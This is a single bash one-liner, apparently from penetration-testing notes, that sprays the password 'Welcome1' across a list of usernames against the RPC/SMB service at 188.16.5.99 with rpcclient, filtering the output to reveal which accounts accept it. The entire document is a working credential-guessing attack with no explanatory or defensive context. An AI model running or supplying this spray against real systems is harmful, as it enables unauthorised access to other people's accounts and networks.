```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 188.16.5.99 | grep Authority; done
```
